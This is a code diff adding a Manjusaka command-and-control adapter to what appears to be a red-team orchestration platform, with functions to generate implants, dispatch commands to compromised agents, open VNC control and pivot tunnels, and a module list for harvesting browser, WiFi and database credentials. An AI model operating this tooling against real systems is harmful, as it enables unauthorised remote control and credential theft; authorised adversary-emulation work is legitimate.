@@ -24,7 +24,7 @@ import { CobaltStrikeAdapter } from "./cobalt-strike-adapter";
 
 // ─── Unified Types ──────────────────────────────────────────────────────────
 
-export type C2FrameworkType = "caldera" | "metasploit" | "sliver" | "empire" | "cobaltstrike";
+export type C2FrameworkType = "caldera" | "metasploit" | "sliver" | "empire" | "cobaltstrike" | "manjusaka";
 
 export type C2AgentStatus = "active" | "dormant" | "dead" | "unknown";
 
@@ -1555,6 +1555,411 @@ export class EmpireAdapter implements IC2Adapter {
   }
 }
 
+// ─── Manjusaka Adapter ──────────────────────────────────────────────────────
+
+/**
+ * Manjusaka C2 adapter using the NPS REST API (Poem + OpenAPI).
+ * Manjusaka is a Rust-based C2 framework with staged implants (NPC1/NPC2),
+ * VNC remote desktop, file management, tunneling, and BOF plugin support.
+ * NPS server exposes an HTTP/HTTPS API on port 33000 by default.
+ *
+ * Manjusaka concepts mapped to unified interface:
+ *   - NPC1 (stage 1 basic agent) + NPC2 (stage 2 enhanced agent) → C2Agent
+ *   - Built-in commands + plugins (BOF, getpass) → C2Module
+ *   - Tasks → C2TaskResult
+ *   - Listeners → required for agent callbacks
+ *   - Tunnels → network pivoting capability
+ */
+export class ManjusakaAdapter implements IC2Adapter {
+  readonly framework: C2FrameworkType = "manjusaka";
+
+  private get baseUrl(): string {
+    return process.env.MANJUSAKA_API_URL || process.env.MANJUSAKA_BASE_URL || "";
+  }
+
+  private get token(): string {
+    return process.env.MANJUSAKA_API_KEY || process.env.MANJUSAKA_TOKEN || "";
+  }
+
+  private async manjusakaFetch(endpoint: string, options: RequestInit = {}): Promise<any> {
+    if (!this.baseUrl) throw new Error("MANJUSAKA_API_URL not configured");
+    const url = `${this.baseUrl}${endpoint}`;
+    const resp = await fetch(url, {
+      ...options,
+      headers: {
+        "Authorization": `Bearer ${this.token}`,
+        "Content-Type": "application/json",
+        ...(options.headers || {}),
+      },
+    });
+    if (!resp.ok) throw new Error(`Manjusaka API ${resp.status}: ${await resp.text()}`);
+    return resp.json().catch(() => null);
+  }
+
+  async healthCheck(): Promise<C2HealthStatus> {
+    try {
+      const [health, agents] = await Promise.all([
+        this.manjusakaFetch("/api/health").catch(() => null),
+        this.manjusakaFetch("/api/agents").catch(() => []),
+      ]);
+      const agentCount = Array.isArray(agents) ? agents.length : (agents?.data?.length || 0);
+      return {
+        framework: "manjusaka",
+        connected: true,
+        version: health?.version || "unknown",
+        agentCount,
+        activeJobs: health?.active_tasks || 0,
+        lastChecked: new Date().toISOString(),
+        details: {
+          npc1Agents: Array.isArray(agents) ? agents.filter((a: any) => a.type === "npc1").length : 0,
+          npc2Agents: Array.isArray(agents) ? agents.filter((a: any) => a.type === "npc2").length : 0,
+          listeners: health?.listeners || 0,
+          tunnels: health?.tunnels || 0,
+        },
+      };
+    } catch (err: any) {
+      return {
+        framework: "manjusaka",
+        connected: false,
+        agentCount: 0,
+        activeJobs: 0,
+        lastChecked: new Date().toISOString(),
+        error: err.message,
+      };
+    }
+  }
+
+  async listAgents(): Promise<C2Agent[]> {
+    try {
+      const data = await this.manjusakaFetch("/api/agents");
+      const agentList = Array.isArray(data) ? data : (data?.data || []);
+
+      return agentList.map((a: any) => ({
+        id: a.id?.toString() || a.agent_id || `mjsk-${Date.now()}`,
+        framework: "manjusaka" as C2FrameworkType,
+        hostname: a.hostname || a.computer_name || "unknown",
+        username: a.username || a.user || "unknown",
+        platform: (a.platform || a.os || "unknown").toLowerCase(),
+        architecture: a.architecture || a.arch || "x64",
+        ipAddress: a.ip_address || a.remote_addr || a.external_ip || "",
+        status: this.mapAgentStatus(a),
+        lastSeen: a.last_checkin || a.last_seen || new Date().toISOString(),
+        privileges: this.inferPrivileges(a),
+        transport: a.transport || a.protocol || "https",
+        metadata: {
+          type: a.type || (a.has_npc2 ? "npc2" : "npc1"),
+          pid: a.pid,
+          npc2Loaded: a.has_npc2 || a.type === "npc2",
+          listenerId: a.listener_id,
+          projectId: a.project_id,
+          vncActive: a.vnc_active || false,
+          tunnelCount: a.tunnel_count || 0,
+        },
+      }));
+    } catch {
+      return [];
+    }
+  }
+
+  private mapAgentStatus(a: any): C2AgentStatus {
+    if (a.status === "active" || a.status === "online") return "active";
+    if (a.status === "dormant" || a.status === "sleeping") return "dormant";
+    if (a.status === "dead" || a.status === "offline") return "dead";
+    // Infer from last checkin
+    const lastCheckin = new Date(a.last_checkin || a.last_seen || 0).getTime();
+    const elapsed = Date.now() - lastCheckin;
+    if (elapsed < 5 * 60 * 1000) return "active";      // < 5 min
+    if (elapsed < 30 * 60 * 1000) return "dormant";     // < 30 min
+    return "dead";
+  }
+
+  private inferPrivileges(a: any): string {
+    const user = (a.username || a.user || "").toLowerCase();
+    if (user === "root" || user === "system" || user.includes("nt authority")) return "system";
+    if (a.is_admin || a.elevated) return "admin";
+    return "user";
+  }
+
+  async getAgent(agentId: string): Promise<C2Agent | null> {
+    try {
+      const data = await this.manjusakaFetch(`/api/agents/${agentId}`);
+      if (!data) return null;
+      const agents = await this.listAgents();
+      return agents.find(a => a.id === agentId) || null;
+    } catch {
+      // Fallback: search in full list
+      const agents = await this.listAgents();
+      return agents.find(a => a.id === agentId) || null;
+    }
+  }
+
+  async searchModules(query: string): Promise<C2Module[]> {
+    // Manjusaka uses built-in commands + plugins (BOF, CRL, getpass)
+    const manjusakaModules: C2Module[] = [
+      // ── Core Commands ──
+      { id: "shell", framework: "manjusaka", name: "Shell", description: "Execute arbitrary shell command", type: "command", platform: ["windows", "linux"], techniqueId: "T1059.003", tactic: "execution" },
+      { id: "interactive-shell", framework: "manjusaka", name: "Interactive Shell", description: "Open interactive terminal session", type: "command", platform: ["windows", "linux"], techniqueId: "T1059", tactic: "execution" },
+      // ── File Management ──
+      { id: "file-browse", framework: "manjusaka", name: "File Browse", description: "Browse filesystem on target", type: "command", platform: ["windows", "linux"], techniqueId: "T1083", tactic: "discovery" },
+      { id: "file-upload", framework: "manjusaka", name: "File Upload", description: "Upload file to target (chunked with resume)", type: "command", platform: ["windows", "linux"], techniqueId: "T1105", tactic: "command-and-control" },
+      { id: "file-download", framework: "manjusaka", name: "File Download", description: "Download file from target (chunked with resume)", type: "command", platform: ["windows", "linux"], techniqueId: "T1005", tactic: "collection" },
+      { id: "file-delete", framework: "manjusaka", name: "File Delete", description: "Delete file on target", type: "command", platform: ["windows", "linux"], techniqueId: "T1070.004", tactic: "defense-evasion" },
+      // ── VNC / Remote Desktop ──
+      { id: "vnc-view", framework: "manjusaka", name: "VNC View", description: "View target desktop via VNC (smart compression, incremental updates)", type: "command", platform: ["windows", "linux"], techniqueId: "T1021.005", tactic: "lateral-movement" },
+      { id: "vnc-control", framework: "manjusaka", name: "VNC Remote Control", description: "Full remote control of target desktop (mouse + keyboard)", type: "command", platform: ["windows", "linux"], techniqueId: "T1021.005", tactic: "lateral-movement" },
+      // ── Screenshot ──
+      { id: "screenshot", framework: "manjusaka", name: "Screenshot", description: "Capture screenshot of target desktop", type: "command", platform: ["windows", "linux"], techniqueId: "T1113", tactic: "collection" },
+      // ── Credential Harvesting ──
+      { id: "browser-creds", framework: "manjusaka", name: "Browser Credentials", description: "Extract credentials from Chromium browsers (Chrome, Edge, Opera, Brave, Vivaldi, 360, QQ)", type: "post", platform: ["windows"], techniqueId: "T1555.003", tactic: "credential-access" },
+      { id: "wifi-passwords", framework: "manjusaka", name: "WiFi Passwords", description: "Extract WiFi SSID passwords via netsh", type: "post", platform: ["windows"], techniqueId: "T1555", tactic: "credential-access" },
+      { id: "navicat-creds", framework: "manjusaka", name: "Navicat Credentials", description: "Extract Navicat database management credentials from registry", type: "post", platform: ["windows"], techniqueId: "T1555", tactic: "credential-access" },
+      { id: "getpass", framework: "manjusaka", name: "GetPass Plugin", description: "Credential extraction plugin (passwords, hashes)", type: "post", platform: ["windows"], techniqueId: "T1003", tactic: "credential-access" },
+      // ── System Reconnaissance ──
+      { id: "sysinfo", framework: "manjusaka", name: "System Info", description: "Comprehensive system information (memory, CPU, temperature, interfaces)", type: "command", platform: ["windows", "linux"], techniqueId: "T1082", tactic: "discovery" },
+      { id: "process-list", framework: "manjusaka", name: "Process List", description: "List running processes with PIDs", type: "command", platform: ["windows", "linux"], techniqueId: "T1057", tactic: "discovery" },
+      { id: "netstat", framework: "manjusaka", name: "Network Connections", description: "List TCP/UDP connections with owning PIDs", type: "command", platform: ["windows", "linux"], techniqueId: "T1049", tactic: "discovery" },
+      { id: "ifconfig", framework: "manjusaka", name: "Network Interfaces", description: "List network interfaces and addresses", type: "command", platform: ["windows", "linux"], techniqueId: "T1016", tactic: "discovery" },
+      { id: "whoami", framework: "manjusaka", name: "Current User", description: "Get current user identity and privileges", type: "command", platform: ["windows", "linux"], techniqueId: "T1033", tactic: "discovery" },
+      // ── Tunneling ──
+      { id: "tunnel-create", framework: "manjusaka", name: "Create Tunnel", description: "Create network tunnel through compromised host for pivoting", type: "command", platform: ["windows", "linux"], techniqueId: "T1090", tactic: "command-and-control" },
+      { id: "tunnel-list", framework: "manjusaka", name: "List Tunnels", description: "List active network tunnels", type: "command", platform: ["windows", "linux"], techniqueId: "T1090", tactic: "command-and-control" },
+      { id: "tunnel-stop", framework: "manjusaka", name: "Stop Tunnel", description: "Terminate an active network tunnel", type: "command", platform: ["windows", "linux"], techniqueId: "T1090", tactic: "command-and-control" },
+      // ── BOF / Plugin Execution ──
+      { id: "bof-execute", framework: "manjusaka", name: "BOF Execute", description: "Execute Beacon Object File (Cobalt Strike compatible BOF)", type: "command", platform: ["windows"], techniqueId: "T1106", tactic: "execution" },
+      { id: "crl-execute", framework: "manjusaka", name: "CRL Plugin Execute", description: "Execute CRL plugin module", type: "command", platform: ["windows", "linux"], techniqueId: "T1106", tactic: "execution" },
+      // ── Agent Management ──
+      { id: "load-npc2", framework: "manjusaka", name: "Load NPC2", description: "Upgrade NPC1 agent to full NPC2 (terminal, VNC, file mgmt, tunnels)", type: "command", platform: ["windows", "linux"], techniqueId: "T1105", tactic: "command-and-control" },
+      { id: "unload-npc2", framework: "manjusaka", name: "Unload NPC2", description: "Unload NPC2 and revert to lightweight NPC1", type: "command", platform: ["windows", "linux"], techniqueId: "T1070", tactic: "defense-evasion" },
+      { id: "self-destruct", framework: "manjusaka", name: "Self Destruct", description: "Remove agent from target and clean up artifacts", type: "command", platform: ["windows", "linux"], techniqueId: "T1070.004", tactic: "defense-evasion" },
+    ];
+
+    const q = query.toLowerCase();
+    return manjusakaModules.filter(c =>
+      c.name.toLowerCase().includes(q) ||
+      c.description.toLowerCase().includes(q) ||
+      c.id.includes(q) ||
+      c.techniqueId?.toLowerCase().includes(q) ||
+      c.tactic?.toLowerCase().includes(q)
+    );
+  }
+
+  async getModule(moduleId: string): Promise<C2Module | null> {
+    const modules = await this.searchModules(moduleId);
+    return modules.find(m => m.id === moduleId) || null;
+  }
+
+  async dispatch(request: C2TaskRequest): Promise<C2TaskResult> {
+    const startedAt = new Date().toISOString();
+    try {
+      const agent = await this.getAgent(request.agentId);
+      if (!agent) throw new Error(`Agent ${request.agentId} not found`);
+
+      const result = await this.manjusakaFetch(`/api/agents/${request.agentId}/task`, {
+        method: "POST",
+        body: JSON.stringify({
+          command: request.moduleId,
+          args: request.options?.args || [],
+          options: request.options || {},
+          timeout: request.timeout || 300,
+        }),
+      });
+
+      const taskId = result?.task_id || result?.id?.toString() || `mjsk-${Date.now()}`;
+      return {
+        taskId,
+        framework: "manjusaka",
+        agentId: request.agentId,
+        moduleId: request.moduleId,
+        status: "running",
+        exitCode: -1,
+        stdout: result?.output || "",
+        stderr: "",
+        startedAt,
+        metadata: { agentType: agent.metadata?.type, response: result },
+      };
+    } catch (err: any) {
+      return {
+        taskId: `mjsk-err-${Date.now()}`,
+        framework: "manjusaka",
+        agentId: request.agentId,
+        moduleId: request.moduleId,
+        status: "error",
+        exitCode: -1,
+        stdout: "",
+        stderr: err.message,
+        startedAt,
+        completedAt: new Date().toISOString(),
+      };
+    }
+  }
+
+  async pollResult(taskId: string, agentId: string): Promise<C2TaskResult> {
+    try {
+      const result = await this.manjusakaFetch(`/api/agents/${agentId}/task/${taskId}`);
+      const completed = result?.status === "completed" || result?.status === "success";
+      return {
+        taskId,
+        framework: "manjusaka",
+        agentId,
+        moduleId: result?.command || "",
+        status: completed ? "success" : (result?.status === "failed" ? "failed" : "running"),
+        exitCode: completed ? 0 : (result?.status === "failed" ? 1 : -1),
+        stdout: result?.output || result?.stdout || "",
+        stderr: result?.error || result?.stderr || "",
+        startedAt: result?.started_at || new Date().toISOString(),
+        completedAt: completed ? (result?.completed_at || new Date().toISOString()) : undefined,
+      };
+    } catch (err: any) {
+      return {
+        taskId, framework: "manjusaka", agentId, moduleId: "",
+        status: "error", exitCode: -1, stdout: "", stderr: err.message,
+        startedAt: new Date().toISOString(),
+      };
+    }
+  }
+
+  async killAgent(agentId: string): Promise<boolean> {
+    try {
+      await this.manjusakaFetch(`/api/agents/${agentId}`, { method: "DELETE" });
+      return true;
+    } catch {
+      return false;
+    }
+  }
+
+  // ─── Manjusaka-Specific Operations ──────────────────────────────────────────
+
+  /** List all active listeners */
+  async listListeners(): Promise<any[]> {
+    try {
+      const data = await this.manjusakaFetch("/api/listeners");
+      return Array.isArray(data) ? data : (data?.data || []);
+    } catch {
+      return [];
+    }
+  }
+
+  /** Create a new listener */
+  async createListener(params: {
+    name: string;
+    protocol: "tcp" | "http" | "https" | "websocket" | "kcp" | "ssh";
+    host: string;
+    port: number;
+    options?: Record<string, any>;
+  }): Promise<any> {
+    return this.manjusakaFetch("/api/listeners", {
+      method: "POST",
+      body: JSON.stringify(params),
+    });
+  }
+
+  /** Stop a listener */
+  async stopListener(listenerId: string): Promise<boolean> {
+    try {
+      await this.manjusakaFetch(`/api/listeners/${listenerId}`, { method: "DELETE" });
+      return true;
+    } catch {
+      return false;
+    }
+  }
+
+  /** Generate NPC1 implant */
+  async generateImplant(params: {
+    platform: "windows" | "linux";
+    architecture: "x64" | "x86";
+    listenerId: string;
+    callbackHost: string;
+    callbackPort: number;
+    transport: "tcp" | "http" | "https" | "websocket" | "kcp";
+    options?: Record<string, any>;
+  }): Promise<any> {
+    return this.manjusakaFetch("/api/payloads/generate", {
+      method: "POST",
+      body: JSON.stringify(params),
+    });
+  }
+
+  /** Load NPC2 on an existing NPC1 agent */
+  async loadNpc2(agentId: string): Promise<any> {
+    return this.manjusakaFetch(`/api/agents/${agentId}/load-npc2`, {
+      method: "POST",
+    });
+  }
+
+  /** Unload NPC2 from an agent */
+  async unloadNpc2(agentId: string): Promise<any> {
+    return this.manjusakaFetch(`/api/agents/${agentId}/unload-npc2`, {
+      method: "POST",
+    });
+  }
+
+  /** Start VNC session on agent */
+  async startVnc(agentId: string): Promise<any> {
+    return this.manjusakaFetch(`/api/agents/${agentId}/vnc/start`, {
+      method: "POST",
+    });
+  }
+
+  /** Stop VNC session on agent */
+  async stopVnc(agentId: string): Promise<any> {
+    return this.manjusakaFetch(`/api/agents/${agentId}/vnc/stop`, {
+      method: "POST",
+    });
+  }
+
+  /** List active tunnels */
+  async listTunnels(): Promise<any[]> {
+    try {
+      const data = await this.manjusakaFetch("/api/tunnels");
+      return Array.isArray(data) ? data : (data?.data || []);
+    } catch {
+      return [];
+    }
+  }
+
+  /** Create a tunnel through an agent */
+  async createTunnel(params: {
+    agentId: string;
+    localPort: number;
+    remoteHost: string;
+    remotePort: number;
+    type?: "tcp" | "socks5";
+  }): Promise<any> {
+    return this.manjusakaFetch("/api/tunnels", {
+      method: "POST",
+      body: JSON.stringify(params),
+    });
+  }
+
+  /** Stop a tunnel */
+  async stopTunnel(tunnelId: string): Promise<boolean> {
+    try {
+      await this.manjusakaFetch(`/api/tunnels/${tunnelId}`, { method: "DELETE" });
+      return true;
+    } catch {
+      return false;
+    }
+  }
+
+  /** Execute BOF on agent */
+  async executeBof(agentId: string, bofPath: string, args?: string[]): Promise<C2TaskResult> {
+    return this.dispatch({
+      agentId,
+      moduleId: "bof-execute",
+      options: { bofPath, args: args || [] },
+    });
+  }
+
+  /** Get aggregate stats */
+  async getStats(): Promise<any> {
+    try {
+      return await this.manjusakaFetch("/api/stats");
+    } catch {
+      return { agents: 0, listeners: 0, tunnels: 0 };
+    }
+  }
+}
+
 // ─── C2 Registry ────────────────────────────────────────────────────────────
 
 /**
@@ -1574,6 +1979,7 @@ export class C2Registry {
       C2Registry.instance.register(new SliverAdapter());
       C2Registry.instance.register(new EmpireAdapter());
       C2Registry.instance.register(new CobaltStrikeAdapter());
+      C2Registry.instance.register(new ManjusakaAdapter());
     }
     return C2Registry.instance;
   }
@@ -1702,4 +2108,8 @@ export function getEmpireAdapter(): EmpireAdapter {
 
 export function getCobaltStrikeAdapter(): CobaltStrikeAdapter {
   return C2Registry.getInstance().get("cobaltstrike") as CobaltStrikeAdapter;
+}
+
+export function getManjusakaAdapter(): ManjusakaAdapter {
+  return C2Registry.getInstance().get("manjusaka") as ManjusakaAdapter;
 }
